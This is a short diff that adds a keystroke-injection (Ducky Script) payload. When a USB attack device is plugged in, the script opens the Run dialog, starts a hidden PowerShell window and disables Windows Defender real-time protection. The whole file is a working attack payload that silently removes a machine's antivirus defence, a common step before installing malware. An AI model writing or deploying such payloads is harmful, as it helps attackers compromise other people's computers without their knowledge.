@@ -1,0 +1,8 @@
+REM Disable Windows Defender
+REM Disables real-time protection
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+ENTER
